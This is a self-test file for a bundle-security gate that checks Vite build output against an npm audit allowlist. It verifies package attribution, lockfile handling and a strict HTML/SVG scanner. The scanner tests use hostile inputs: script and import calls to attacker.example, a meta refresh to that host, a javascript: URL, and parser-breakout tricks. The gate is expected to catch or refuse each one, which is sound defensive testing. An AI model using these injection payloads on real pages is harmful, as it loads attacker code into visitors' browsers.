// Self-test for npm-audit-allowlist-bundle-check.mjs: `node --test npm-audit-allowlist-bundle-check.test.mjs`.
// The real-build cases need the cwd (or BUNDLE_CHECK_VITE_PROJECT) to be a project with Vite, react and
// picomatch installed (both this repository's npm projects qualify after `npm ci`). A missing Vite is a
// test FAILURE, not a skip: the real-build cases are the point.
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { cpSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { createRequire } from "node:module";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { test } from "node:test";
import { pathToFileURL } from "node:url";

import { GateError, parseAllowlist } from "./npm-audit-allowlist.mjs";
import {
  WORKER_PREFIX,
  buildGraph,
  checkDocuments,
  classifyModule,
  decodeDocument,
  decodeEntities,
  evaluateGraph,
  gitTracked,
  inertKind,
  judgeOutput,
  main,
  normalizeInline,
  parseArgs,
  parseAttributes,
  parseBundleTrust,
  parseStartTag,
  projectKey,
  readInstalledLock,
  refreshUrl,
  resolveVite,
  scanDocument,
  sha256,
  tripwire,
  walkOutput,
} from "./npm-audit-allowlist-bundle-check.mjs";

const NOW = Date.parse("2026-11-18T12:00:00Z");
const REASON = "a".repeat(40);
const ALLOW_ENTRY = { id: "GHSA-fc5q-39xc-vjpf", package: "picomatch", reason: REASON, added: "2026-11-18", expires: "2026-12-16T00:00:00Z" };
const EMBED = "customElements.define('x-embed', class extends HTMLElement {});\n";
const INLINE = "window.__t = 1";
const REDIRECT = "^window\\.location\\.replace\\('/site/(?:[a-z-]+/)*' \\+ window\\.location\\.search\\);$";
/** The allowlist document the mini projects are judged with: picomatch exempt, embed.js and the inline stub pinned for project ".". */
const ALLOW_DOC = {
  allow: [ALLOW_ENTRY],
  bundle: {
    trustedVirtualModules: [{ id: "\u0000virtual:fixture", project: ".", reason: REASON }],
    firstPartyScripts: [
      { project: ".", public: "embed.js", sha256: sha256(EMBED), reason: REASON },
      { project: ".", inline: "sha256", sha256: sha256(normalizeInline(INLINE)), reason: REASON },
      { project: ".", inline: "pattern", pattern: REDIRECT, reason: REASON },
      { project: "other", public: "other.js", sha256: "0".repeat(64), reason: REASON },
    ],
  },
};
const allow = parseAllowlist(ALLOW_DOC, NOW);
const trust = parseBundleTrust(ALLOW_DOC, ".");
const ROOT = "/work/app";
/** package.json names of the synthetic installs below, by directory label; anything else has no named package.json. */
const NAMES = { picomatch: "picomatch", "picomatch/lib": "matcher-internal", react: "react", tinyglobby: "tinyglobby", "@scope/name": "@scope/name", matcher: "picomatch", "@aws-amplify/core": "@aws-amplify/core", mislabelled: "picomatch" };
/** Directories whose package.json exists but carries no name (an npm installation never looks like this). */
const NAMELESS = new Set(["aliasn", "strayn"]);
const labelOf = (dir) => dir.slice(dir.lastIndexOf("/node_modules/") + "/node_modules/".length);
const stubManifest = (dir) => {
  const label = labelOf(dir);
  if (Object.hasOwn(NAMES, label)) return { present: true, name: NAMES[label] };
  return { present: NAMELESS.has(label), name: null };
};
/** The lockfile `packages` npm recorded for the synthetic install root ROOT (aliases carry `name`); other roots have no lockfile. */
const LOCK = {
  "node_modules/picomatch": {}, "node_modules/react": {}, "node_modules/tinyglobby": {}, "node_modules/@scope/name": {}, "node_modules/@aws-amplify/core": {},
  "node_modules/matcher": { name: "picomatch" }, "node_modules/vite": {}, "node_modules/vite/node_modules/picomatch": {},
  "node_modules/.pnpm/picomatch@4.0.7/node_modules/picomatch": {}, "node_modules/devtool": {}, "node_modules/devtool/node_modules/matcher": { name: "picomatch" },
  "node_modules/devtool/node_modules/aliasn": { name: "picomatch" }, "node_modules/mislabelled": { name: "left-pad" },
};
const stubLock = (installRoot) => (installRoot === ROOT ? LOCK : null);
const throwsGate = (fn, pattern) => assert.throws(fn, (error) => error instanceof GateError && pattern.test(error.message));
const rejectsGate = (promise, pattern) => assert.rejects(promise, (error) => error instanceof GateError && pattern.test(error.message));
const silent = { log() {}, error() {} };
const APP = [`${ROOT}/src/main.tsx`, `${ROOT}/src/App.tsx`, `${ROOT}/node_modules/react/index.js`, "\u0000vite/preload-helper.js"];
const chunks = (entries) => new Map(entries);
const graph = (chunkEntries, assets = [], over = {}) =>
  evaluateGraph({ chunks: chunks(chunkEntries), assets: new Map(assets.map((name) => [name, "asset"])), allow, firstPartyRoot: ROOT, readManifest: stubManifest, readLock: stubLock, ...over });

test("module ids are attributed to the package NAMED in their installed directory, or to first-party, virtual or unknown", () => {
  const pkg = (id) => classifyModule(id, ROOT, { trustedVirtual: trust.virtual, readManifest: stubManifest, readLock: stubLock });
  assert.deepEqual(pkg(`${ROOT}/node_modules/picomatch/lib/picomatch.js`), { kind: "package", name: "picomatch", dir: "picomatch" });
  // Ownership is npm's installation boundary: a nested manifest inside the installed package (NAMES says
  // picomatch/lib/package.json is named "matcher-internal") is never consulted and cannot re-attribute it.
  assert.deepEqual(pkg(`${ROOT}/node_modules/picomatch/lib/scan.js`), { kind: "package", name: "picomatch", dir: "picomatch" });
  assert.deepEqual(pkg(`${ROOT}/node_modules/@scope/name/dist/index.js`), { kind: "package", name: "@scope/name", dir: "@scope/name" });
  assert.deepEqual(pkg(`${ROOT}/node_modules/.pnpm/picomatch@4.0.7/node_modules/picomatch/index.js`).name, "picomatch");
  assert.deepEqual(pkg(`${ROOT}/node_modules/vite/node_modules/picomatch/index.js`).name, "picomatch");
  assert.deepEqual(pkg(`${ROOT}/node_modules/other/../picomatch/lib/picomatch.js`).name, "picomatch");
  assert.deepEqual(pkg(`${ROOT}/node_modules/picomatch/index.js?commonjs-exports`).name, "picomatch");
  assert.deepEqual(pkg(`\u0000${ROOT}/node_modules/picomatch/index.js?commonjs-proxy`).name, "picomatch");
  assert.deepEqual(pkg(`${ROOT}\\node_modules\\picomatch\\index.js`).name, "picomatch");
  // An npm alias installs picomatch under another directory name: the package.json name wins.
  assert.deepEqual(pkg(`${ROOT}/node_modules/matcher/index.js`), { kind: "package", name: "picomatch", dir: "matcher" });
  // A library vendored under its own node_modules segment inside another package's dist, with no manifest of
  // its own, belongs to the package that ships it (the innermost boundary with a readable name); a vendored
  // segment that does carry a named manifest is attributed by that manifest.
  assert.deepEqual(pkg(`${ROOT}/node_modules/@aws-amplify/core/dist/esm/node_modules/tslib/tslib.es6.mjs`), { kind: "package", name: "@aws-amplify/core", dir: "@aws-amplify/core" });
  assert.deepEqual(pkg(`${ROOT}/node_modules/react/dist/node_modules/matcher/index.js`), { kind: "package", name: "picomatch", dir: "matcher" });
  assert.deepEqual(pkg(`${ROOT}/node_modules/@aws-amplify/core/dist/esm/vendor/picomatch/index.js`).name, "@aws-amplify/core"); // embedded copy: the shipping package
  // No readable manifest name at any boundary establishes no identity: the label is never trusted (an alias
  // directory holding the allowlisted package must not pass as its label when its manifest is unreadable).
  assert.match(pkg(`${ROOT}/node_modules/broken/index.js`).why, /the directory broken is not recorded in a lockfile and has no package\.json/);
  assert.match(pkg(`${ROOT}/node_modules/aliasx/lib/picomatch.js`).why, /not recorded in a lockfile/);
  // An unrecorded directory whose package.json exists but has no name is no installation this gate can name:
  // npm records every package it installs and never installs a nameless one. Fail closed, never the parent.
  assert.match(pkg(`${ROOT}/node_modules/devtool/node_modules/strayn/lib/picomatch.js`).why, /strayn is not recorded in a lockfile and its package\.json has no readable name/);
  // The lockfile records installations, nested ones included: a nested alias is the package the lockfile names,
  // even when its own manifest is nameless; a manifest contradicting the lockfile is no identity at all.
  assert.deepEqual(pkg(`${ROOT}/node_modules/devtool/node_modules/matcher/index.js`), { kind: "package", name: "picomatch", dir: "matcher" });
  assert.deepEqual(pkg(`${ROOT}/node_modules/devtool/node_modules/aliasn/lib/picomatch.js`), { kind: "package", name: "picomatch", dir: "aliasn" });
  assert.match(pkg(`${ROOT}/node_modules/mislabelled/index.js`).why, /recorded in the lockfile as left-pad but its package\.json is named picomatch/);
  assert.match(classifyModule("/elsewhere/node_modules/picomatch/index.js", ROOT, { readManifest: stubManifest, readLock: stubLock }).why, /no valid lockfile/);
  assert.deepEqual(pkg(`${ROOT}/src/main.tsx`), { kind: "first-party" });
  assert.deepEqual(pkg(`${ROOT}/src/../index.html`), { kind: "first-party" });
  // Vite's own helpers (exact names), and the virtual module the fixture allowlist trusts explicitly.
  assert.deepEqual(pkg("\u0000vite/preload-helper.js"), { kind: "virtual" });
  assert.deepEqual(pkg("\u0000vite/modulepreload-polyfill.js"), { kind: "virtual" });
  assert.deepEqual(pkg("\u0000commonjsHelpers.js"), { kind: "virtual" });
  assert.deepEqual(pkg("__vite-browser-external"), { kind: "virtual" });
  assert.deepEqual(pkg("\u0000__vite-browser-external:path"), { kind: "virtual" });
  assert.deepEqual(pkg("\u0000__vite-browser-external:node:fs"), { kind: "virtual" });
  assert.deepEqual(pkg("\u0000virtual:fixture"), { kind: "virtual" });
  // Anything else virtual is unknown, however it is spelled; dot namespaces are not packages.
  for (const id of ["\u0000virtual:matcher", "virtual:matcher", "\u0000plugin-helper.js", "\u0000__vite-browser-external-payload", "\u0000__vite-browser-external/payload", "__vite-browser-externalx", "\u0000vite/other.js"]) {
    assert.equal(pkg(id).kind, "unknown", id);
  }
  assert.equal(classifyModule("\u0000virtual:fixture", ROOT, { readManifest: stubManifest, readLock: stubLock }).kind, "unknown");
  assert.match(pkg(`${ROOT}/node_modules/.vite/deps/picomatch.js`).why, /no installed package directory/);
  assert.equal(pkg(`${ROOT}/node_modules/@scope/.cache/x.js`).kind, "unknown");
  assert.equal(pkg(`${ROOT}/node_modules/@scope/name/.cache/x.js`).name, "@scope/name"); // the dot directory is inside a real package
  for (const id of ["/elsewhere/lib/thing.js", `${ROOT}/../sibling/index.js`, `${ROOT}/node_modules/`, `${ROOT}/node_modules/@scope`, "", undefined]) {
    assert.equal(pkg(id).kind, "unknown", String(id));
  }
  // The first-party root is compared as a path, not a prefix string.
  assert.equal(classifyModule("/work/application/src/x.js", ROOT, { readManifest: stubManifest, readLock: stubLock }).kind, "unknown");
  assert.deepEqual(classifyModule(`${ROOT}/src/x.js`, `${ROOT}/`, { readManifest: stubManifest, readLock: stubLock }), { kind: "first-party" });
});

test("lockfiles are validated and reconciled: malformed or incomplete hidden metadata cannot hide an installation", () => {
  const dir = mkdtempSync(join(tmpdir(), "bundle-check-lock-"));
  try {
    let n = 0;
    /** A fresh install root with the given hidden and regular lockfiles (objects are serialised, strings written as is). */
    const root = (hiddenLock, regularLock) => {
      const r = join(dir, `case-${n++}`);
      mkdirSync(join(r, "node_modules"), { recursive: true });
      if (hiddenLock !== undefined) writeFileSync(join(r, "node_modules", ".package-lock.json"), typeof hiddenLock === "string" ? hiddenLock : JSON.stringify(hiddenLock));
      if (regularLock !== undefined) writeFileSync(join(r, "package-lock.json"), typeof regularLock === "string" ? regularLock : JSON.stringify(regularLock));
      return r;
    };
    const alias = { "node_modules/devtool": {}, "node_modules/devtool/node_modules/matcher": { name: "picomatch" } };
    const nameless = () => ({ present: true, name: null });
    assert.equal(readInstalledLock(root()), null);
    assert.equal(readInstalledLock(root({ lockfileVersion: 3, packages: [] }, { lockfileVersion: 1, dependencies: {} })), null); // an array map and a v1 lockfile are both invalid
    assert.equal(readInstalledLock(root("{ not json", { lockfileVersion: 3, packages: { "node_modules/x": "bad" } })), null); // entries must be objects
    // A malformed hidden lockfile does not suppress the regular one, and an incomplete one is completed by it.
    assert.deepEqual(readInstalledLock(root({ lockfileVersion: 3, packages: [] }, { lockfileVersion: 3, packages: alias }))["node_modules/devtool/node_modules/matcher"], { name: "picomatch" });
    assert.deepEqual(readInstalledLock(root({ lockfileVersion: 3, packages: { "node_modules/devtool": {} } }, { lockfileVersion: 2, packages: alias }))["node_modules/devtool/node_modules/matcher"], { name: "picomatch" });
    // Disagreement between the two is a conflict, which classification treats as no identity.
    const conflicting = root({ lockfileVersion: 3, packages: { "node_modules/matcher": { name: "left-pad" } } }, { lockfileVersion: 3, packages: { "node_modules/matcher": { name: "picomatch" } } });
    assert.deepEqual(readInstalledLock(conflicting)["node_modules/matcher"], { conflict: ["left-pad", "picomatch"] });
    assert.match(classifyModule(`${conflicting}/node_modules/matcher/index.js`, dir, { readManifest: () => ({ present: true, name: "picomatch" }) }).why, /recorded under different names/);
    // Through the real reader: a nameless nested alias is named by the lockfile that records it, and is no
    // identity at all when neither lockfile records it.
    const recorded = root({ lockfileVersion: 3, packages: alias });
    assert.deepEqual(classifyModule(`${recorded}/node_modules/devtool/node_modules/matcher/lib/picomatch.js`, dir, { readManifest: nameless }), { kind: "package", name: "picomatch", dir: "matcher" });
    const omitted = root({ lockfileVersion: 3, packages: { "node_modules/devtool": {} } });
    assert.match(classifyModule(`${omitted}/node_modules/devtool/node_modules/matcher/lib/picomatch.js`, dir, { readManifest: nameless }).why, /package\.json has no readable name/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("an allowlisted package in any chunk is a violation; unknown ownership and opaque assets fail closed", () => {
  const clean = graph([["assets/index.js", APP]], ["assets/index.css", "index.html", "assets/logo.svg", "assets/font.woff2", "assets/notes.txt", "data.json"]);
  assert.deepEqual(clean.violations, []);
  assert.deepEqual([clean.modules, clean.firstParty, clean.virtual, [...clean.packages]], [4, 2, 1, ["react"]]);
  const shipped = graph([
    ["assets/index.js", APP],
    [`${WORKER_PREFIX}1:worker.js`, [`${ROOT}/src/w.js`, `\u0000${ROOT}/node_modules/picomatch/index.js?commonjs-proxy`, `${ROOT}/node_modules/matcher/lib/picomatch.js`]],
  ]);
  assert.equal(shipped.violations.length, 2);
  assert.match(shipped.violations[0], /^picomatch is bundled into worker1:worker\.js: /);
  assert.match(shipped.violations[1], /\(installed as matcher\)$/);
  throwsGate(() => graph([]), /emitted no JavaScript chunk/);
  throwsGate(() => graph([["a.js", []]]), /lists no modules/);
  throwsGate(() => graph([["a.js", [...APP, "/elsewhere/x.js"]]]), /ownership cannot be established: outside the first-party root/);
  throwsGate(() => graph([["a.js", [...APP, "\u0000virtual:matcher"]]]), /not listed in bundle\.trustedVirtualModules/);
  throwsGate(() => graph([["a.js", [...APP, `${ROOT}/node_modules/.vite/deps/picomatch.js`]]]), /no installed package directory/);
  throwsGate(() => graph([["a.js", [...APP, `${ROOT}/node_modules/broken/index.js`]]]), /not recorded in a lockfile/); // no identity: fail closed
  throwsGate(() => graph([["a.js", [...APP, `${ROOT}/node_modules/devtool/node_modules/strayn/lib/picomatch.js`]]]), /package\.json has no readable name/); // never the parent
  assert.match(graph([["a.js", [...APP, `${ROOT}/node_modules/devtool/node_modules/aliasn/lib/picomatch.js`]]]).violations[0], /^picomatch is bundled into a\.js: .*aliasn\/lib\/picomatch\.js \(installed as aliasn\)$/); // the lockfile names the nested alias
  throwsGate(() => graph([["a.js", APP]], ["assets/worker-abc.js"]), /opaque executable/);
  throwsGate(() => graph([["a.js", APP]], ["assets/payload"]), /no recognised inert type/);
  throwsGate(() => graph([["a.js", APP]], ["assets/module.wasm"]), /no recognised inert type/);
  throwsGate(() => graph([["a.js", [`${ROOT}/node_modules/react/index.js`]]]), /no first-party module/);
  throwsGate(() => graph([["a.js", [`${ROOT}/src/main.tsx`]]]), /no npm package/);
  // XHTML is an XML document to a browser (application/xhtml+xml), not an HTML one.
  // PDF is not inert either: it can embed JavaScript for a browser's viewer, so it is an opaque payload.
  assert.deepEqual(["x.html", "x.xhtml", "x.svg", "sitemap.xml", "x.css", "x.png", "x.wasm", "x.pdf", "x"].map(inertKind), ["html", "xml", "xml", "xml", "text", "binary", null, null, null]);
});

test("the bundle-trust section is validated strictly and filtered by project", () => {
  assert.deepEqual([...trust.virtual], ["\u0000virtual:fixture"]);
  assert.deepEqual([...trust.publicScripts], [["embed.js", sha256(EMBED)]]);
  assert.equal(trust.inline.length, 2);
  const other = parseBundleTrust(ALLOW_DOC, "other");
  assert.deepEqual([[...other.virtual], [...other.publicScripts.keys()], other.inline], [[], ["other.js"], []]);
  assert.deepEqual(parseBundleTrust({ allow: [] }, ".").inline, []);
  const doc = (bundle) => ({ allow: [], bundle });
  throwsGate(() => parseBundleTrust([], "."), /must be an object/);
  throwsGate(() => parseBundleTrust(doc([]), "."), /"bundle" must be an object/);
  throwsGate(() => parseBundleTrust(doc({ firstPartyScripts: {} }), "."), /must be an array/);
  throwsGate(() => parseBundleTrust(doc({ trustedVirtualModules: [{ id: "x", project: ".", reason: "short" }] }), "."), /written reason/);
  throwsGate(() => parseBundleTrust(doc({ trustedVirtualModules: [{ project: ".", reason: REASON }] }), "."), /virtual module id/);
  throwsGate(() => parseBundleTrust(doc({ trustedVirtualModules: [{ id: "x", reason: REASON }] }), "."), /name its project/);
  const pin = (over) => doc({ firstPartyScripts: [{ project: ".", reason: REASON, ...over }] });
  throwsGate(() => parseBundleTrust(pin({}), "."), /exactly one of/);
  throwsGate(() => parseBundleTrust(pin({ public: "a.js", inline: "sha256", sha256: "0".repeat(64) }), "."), /exactly one of/);
  throwsGate(() => parseBundleTrust(pin({ public: "/a.js", sha256: "0".repeat(64) }), "."), /relative script path/);
  throwsGate(() => parseBundleTrust(pin({ public: "../a.js", sha256: "0".repeat(64) }), "."), /relative script path/);
  throwsGate(() => parseBundleTrust(pin({ public: "a.txt", sha256: "0".repeat(64) }), "."), /relative script path/);
  throwsGate(() => parseBundleTrust(pin({ public: "a.js", sha256: "0".repeat(63) }), "."), /64 lowercase hex/);
  throwsGate(() => parseBundleTrust(pin({ public: "a.js", sha256: "A".repeat(64) }), "."), /64 lowercase hex/);
  throwsGate(() => parseBundleTrust(doc({ firstPartyScripts: [{ project: ".", reason: REASON, public: "a.js", sha256: "0".repeat(64) }, { project: ".", reason: REASON, public: "a.js", sha256: "1".repeat(64) }] }), "."), /pinned twice/);
  throwsGate(() => parseBundleTrust(pin({ inline: "sha256" }), "."), /64 lowercase hex/);
  throwsGate(() => parseBundleTrust(pin({ inline: "pattern", pattern: "window" }), "."), /anchored/);
  throwsGate(() => parseBundleTrust(pin({ inline: "pattern", pattern: "^(x$" }), "."), /does not compile/);
  throwsGate(() => parseBundleTrust(pin({ inline: "regex", pattern: "^x$" }), "."), /"sha256" or "pattern"/);
  // A defective entry for another project still fails this project's run.
  throwsGate(() => parseBundleTrust(pin({ project: "other", public: "a.js", sha256: "bad" }), "."), /64 lowercase hex/);
});

test("documents are tokenised conservatively: comments, declarations, contexts, attributes and schemes", () => {
  const scan = (html, opts) => scanDocument(html, "doc", opts);
  assert.equal(scan('<!doctype html><html><head><script type="module" crossorigin src="/a.js"></script></head></html>').scripts[0].attrs.get("src"), "/a.js");
  assert.equal(scan("<SCRIPT SRC=a.js></SCRIPT>").scripts[0].attrs.get("src"), "a.js");
  assert.equal(scan('<script data-src="/a.js">x</script>').scripts[0].attrs.has("src"), false);
  assert.equal(scan('<script data-src="/a.js" src="https://cdn.example.invalid/x.js"></script>').scripts[0].attrs.get("src"), "https://cdn.example.invalid/x.js");
  assert.equal(scan(`<script title="a > b" src='/a.js'></script>`).scripts[0].attrs.get("src"), "/a.js");
  assert.equal(scan('<script type="text/plain">var s = "<script>"; </script>').scripts.length, 1);
  assert.equal(scan("<scripts></scripts><script>x</script>").scripts.length, 1);
  assert.equal(scan("<script>a</script><script>b</script>").scripts[1].body, "b");
  assert.equal(scan("<style>a > b { color: red }</style><title>x &lt; y</title><p>a &lt; b</p>").scripts.length, 0);
  assert.equal(scan("<!-- hash-shim --><br/><img src=x.png alt='a > b'>").scripts.length, 0);
  assert.deepEqual(scan('<link rel="modulepreload" href="/a.js"><link rel="preload" as="script" href="b.js"><link rel="preload" as="style" href="c.css">').preloads, ["/a.js", "b.js"]);
  assert.deepEqual(scan('<meta http-equiv="refresh" content="0; url=/site/x/" />').refreshes, ["/site/x/"]);
  assert.deepEqual(scan('<svg xmlns="http://www.w3.org/2000/svg"><path d="M0 0h1"/></svg>').scripts, []);
  assert.equal(scan('<?xml version="1.0"?><svg><script>x</script></svg>', { xml: true }).scripts.length, 1);
  // Raw-text contexts and tag boundaries as the browser reads them: the executable script is the one found.
  // <noscript> is raw text with scripting enabled, but a scripting-disabled browser parses its body as markup,
  // so the body is judged under both models: its refreshes and preloads count and its attributes are checked.
  throwsGate(() => scan('<noscript><script type="application/json"></noscript><script>globalThis.pwned=1</script>'), /<noscript>: <script> without <\/script>/);
  assert.deepEqual(scan('<noscript><meta http-equiv="refresh" content="0; url=https://attacker.example/p.html"></noscript>').refreshes, ["https://attacker.example/p.html"]);
  throwsGate(() => scan('<noscript><img src=x onerror="x()"></noscript>'), /inline event handler/);
  assert.equal(scan("<noscript><p>Enable JavaScript.</p></noscript><noscript>plain text</noscript>").scripts.length, 0);
  assert.deepEqual(scan('<style></stylex><script type="application/json"></style><script>globalThis.pwned=1</script>').scripts.map((s) => s.body), ["globalThis.pwned=1"]);
  assert.deepEqual(scan('<svg xmlns:xlink="http://www.w3.org/1999/xlink"><script xlink:href="https://cdn.example.invalid/p.js"></script></svg>').scripts[0].attrs.get("xlink:href"), "https://cdn.example.invalid/p.js");
  throwsGate(() => scan('<script! type="application/json"><script>globalThis.pwned=1</script>'), /unsupported tag name/);
  throwsGate(() => scan('<svg xmlns:s="http://www.w3.org/2000/svg"><s:script>globalThis.pwned=1</s:script></svg>', { xml: true }), /qualified element name/);
  throwsGate(() => scan('<?xml-stylesheet href="x.css"?><svg></svg>', { xml: true }), /processing instructions/);
  throwsGate(() => scan('<?xmlversion="1.0"?><svg></svg>', { xml: true }), /processing instructions/);
  for (const html of ['<svg><a href="https://example.invalid/"><animate attributeName="href" values="https://example.invalid/;javascript:alert(1)" dur="1s" fill="freeze"/></a></svg>', "<svg><set attributeName=href to=x /></svg>", "<svg><animateTransform/></svg>"]) {
    throwsGate(() => scan(html), /SVG animation element/, html);
  }
  // Doctypes: only the plain HTML one; a quoted identifier could hide ">" and markup. None at all in XML.
  assert.equal(scan("<!DOCTYPE html>\n<html></html>").scripts.length, 0);
  throwsGate(() => scan('<!doctype html SYSTEM "><style>"><script src="https://attacker.example/p.js"></script></style>'), /unsupported declaration/);
  throwsGate(() => scan('<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0//EN"><html></html>'), /unsupported declaration/);
  throwsGate(() => scan('<?xml version="1.0"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "x.dtd"><svg></svg>', { xml: true }), /unsupported declaration/);
  // Only ASCII whitespace delimits a tag name; U+00A0 makes "<style >" an unknown element to a browser.
  throwsGate(() => scan('<style ><script src="https://attacker.example/p.js"></script></style>'), /unsupported tag name/);
  throwsGate(() => scan('<script src="x.js"></script>'), /unsupported tag name/);
  assert.equal(scan("<style></style ><script src='https://attacker.example/p.js'></script></style>").scripts.length, 0); // still inside <style>, as in a browser
  throwsGate(() => scan("<style>a</style >"), /without <\/style>/);
  assert.equal(scan("<script\t>a</script\n>").scripts[0].body, "a");
  // Inside <svg> nothing is raw text: <style> and <textarea> are foreign elements whose children are tags, so a
  // script "hidden" in them is found. <title>/<desc> are HTML integration points and are refused; so is MathML.
  throwsGate(() => scan('<svg><title><script src="https://attacker.example/p.js"></script></title></svg>'), /inside <svg> is an HTML integration point/);
  throwsGate(() => scan("<svg><desc>x</desc></svg>"), /inside <svg> is an HTML integration point/);
  assert.equal(scan("<svg><style>.a{}</style><textarea></textarea></svg>").scripts.length, 0);
  assert.deepEqual(scan("<svg><style><script>globalThis.pwned=1</script></style></svg>").scripts.map((s) => s.body), ["globalThis.pwned=1"]);
  assert.deepEqual(scan("<svg><textarea><script>globalThis.pwned=1</script></textarea></svg>").scripts.map((s) => s.body), ["globalThis.pwned=1"]);
  throwsGate(() => scan("<math><mi>x</mi></math>"), /<math> is refused/);
  assert.equal(scan("<svg><g><path d='M0 0'/></g></svg><title>ok</title>").scripts.length, 0); // depth returns to 0 after </svg>
  assert.equal(scan('<svg><script>svgCode()</script></svg>').scripts[0].body, "svgCode()");
  throwsGate(() => scan("<svg><script><b>x</b></script></svg>"), /markup inside an SVG\/XML <script>/);
  // In XML every "<" starts markup: an SVG file's <title>, <desc> and <style> are ordinary elements.
  assert.equal(scan('<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><title>t</title><desc>d</desc><style>.a{fill:#000}</style></svg>', { xml: true }).scripts.length, 0);
  assert.equal(scan('<svg xmlns="http://www.w3.org/2000/svg"><title><script>x</script></title></svg>', { xml: true }).scripts.length, 1);
  assert.equal(scan('<svg xmlns="http://www.w3.org/2000/svg"><style><script>x</script></style></svg>', { xml: true }).scripts.length, 1);
  throwsGate(() => scan('<svg xmlns="http://www.w3.org/2000/svg"><style>a < b</style></svg>', { xml: true }), /does not start a tag/);
  // Parsing contexts a browser enters that this scanner refuses rather than models.
  throwsGate(() => scan("<select><style><script>globalThis.pwned=1</script></style></select>"), /<select> is refused/);
  throwsGate(() => scan("<select><option>a</option></select>", { xml: true }), /<select> is refused/);
  throwsGate(() => scan("<script><!--<script>a</script>globalThis.pwned=1--></script>"), /script data escape sequence/);
  assert.equal(scan("<script>if (a<b) go()</script>").scripts[0].body, "if (a<b) go()");
  // The self-closing flag as the tokenizer sets it: a "/" ending an unquoted value is value data, so
  // "<svg a=b/>" opens an svg element and the script inside its <style> is found; "<svg/ >" is not
  // self-closing to a browser either and fails here as unparsable.
  assert.deepEqual(scan("<svg a=b/><style><script>globalThis.pwned=1</script></style></svg>").scripts.map((s) => s.body), ["globalThis.pwned=1"]);
  assert.deepEqual(scan("<svg a=/><style><script>globalThis.pwned=1</script></style></svg>").scripts.map((s) => s.body), ["globalThis.pwned=1"]);
  throwsGate(() => scan("<svg/ ><style><script>globalThis.pwned=1</script></style></svg>"), /cannot parse attributes/);
  throwsGate(() => scan("<svg a=b/ ><title>t</title></svg>"), /integration point/); // the element is open: a="b/", then ">"
  assert.equal(scan('<svg a="b"/><svg c/><svg d=e /><style>.a{}</style>').scripts.length, 0); // genuinely self-closing: no svg context
  assert.equal(scan("<script a=b/>x</script>").scripts[0].body, "x");
  // An SVG script element has no `language` attribute: it is marked foreign and judged on `type` alone.
  assert.deepEqual(scan('<svg><script language="vbscript">x</script></svg>').scripts.map((s) => s.foreign), [true]);
  assert.deepEqual(scan('<script language="vbscript">x</script>').scripts.map((s) => s.foreign), [false]);
  // Parsing contexts a browser enters that this scanner refuses rather than models: <template> insertion
  // modes, and the start/end tags that make a browser leave foreign content while <svg> is open.
  throwsGate(() => scan('<template><col><style></template><script src="https://attacker.example/matcher.js"></script></style>'), /<template> is refused/);
  throwsGate(() => scan('<svg><p><script/>import("https://attacker.example/matcher.js")</script></svg>'), /foreign-content breakout/);
  throwsGate(() => scan('<svg></p><script/>import("https://attacker.example/matcher.js")</script></svg>'), /foreign-content breakout/);
  throwsGate(() => scan("<svg><font color=red><script/>x</script></svg>"), /foreign-content breakout/);
  throwsGate(() => scan("<svg><g><div>x</div></g></svg>"), /foreign-content breakout/);
  assert.equal(scan("<svg><g><rect/></g></svg><p>fine</p><div>ok</div><br>").scripts.length, 0); // the same tags outside <svg> are fine
  throwsGate(() => scan("<svg / ><style><script>globalThis.pwned=1</script></style></svg>"), /cannot parse attributes/);
  // Encodings: the bytes are read as UTF-8, so a document may declare nothing else.
  throwsGate(() => scan("<meta charset=iso-2022-jp><style></style>"), /declares the charset "iso-2022-jp"/);
  throwsGate(() => scan('<meta http-equiv="content-type" content="text/html; charset=windows-1252">'), /declares the charset "windows-1252"/);
  throwsGate(() => scan('<meta http-equiv="Content-Type" content="text/html; charset=&#x69;so-2022-jp">'), /declares the charset "iso-2022-jp"/);
  assert.equal(scan('<meta charset="UTF-8"><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta name=viewport content=x>').scripts.length, 0);
  throwsGate(() => scan('<?xml version="1.0" encoding="ISO-2022-JP"?><svg/>', { xml: true }), /XML declaration encoding "ISO-2022-JP"/);
  assert.equal(scan('<?xml version="1.0" encoding="UTF-8"?><svg/>', { xml: true }).scripts.length, 0);
  // Inside <svg> markup must nest: a browser pops the svg element for an HTML ancestor's end tag, after which
  // "<script/>" is an HTML script whose body runs; an unmatched end tag inside <svg> is refused either way.
  throwsGate(() => scan('<div><svg></div><script/>import("https://attacker.example/matcher.js")</script></svg>'), /misnested markup is refused/);
  throwsGate(() => scan("<svg><g></svg>"), /<\/svg> inside <svg> does not close the innermost open <g>/);
  throwsGate(() => scan("<svg><g><rect></g></svg>"), /misnested markup is refused/);
  assert.equal(scan('<svg><g><path d="M0 0"/><rect></rect></g><svg><g/></svg></svg><div>after</div>').scripts.length, 0);
  assert.deepEqual(scan("<svg><g><script>svgCode()</script></g></svg>").scripts.map((s) => s.body), ["svgCode()"]); // a foreign script is consumed with its end tag
  // No Unicode-lowercased copy is indexed with original offsets: twelve U+0130 (each lowercases to two code
  // units) would shift every marker after them so that a real <script> looked like a comment.
  const dotted = "İ".repeat(12);
  assert.equal(scan(`<style>${dotted}<!--</style><script src="https://attacker.example/p.js?-->"></script>`).scripts.length, 1);
  assert.equal(scan(`<p>${dotted}</p><script>x</script>`).scripts[0].body, "x");
  throwsGate(() => scan("<![cdata[ x ]]>"), /unsupported declaration/); // not CDATA to a browser either; refused as a declaration
  throwsGate(() => scan('<?XML version="1.0"?><svg/>', { xml: true }), /processing instructions/); // the XML declaration is lower-case only
  // Character references in attributes: "&bsol;" is a backslash to a browser (so "&bsol;&bsol;host" is a
  // network URL); a terminated name the gate does not model is refused; unterminated query parameters pass.
  assert.deepEqual(scan('<meta http-equiv="refresh" content="0; url=&bsol;&bsol;attacker.example/x">').refreshes, ["\\\\attacker.example/x"]); // decoded as a browser would; refused when resolved
  // A quoted refresh URL ends at its matching quote (the browser would go to attacker.example); trailing text is refused.
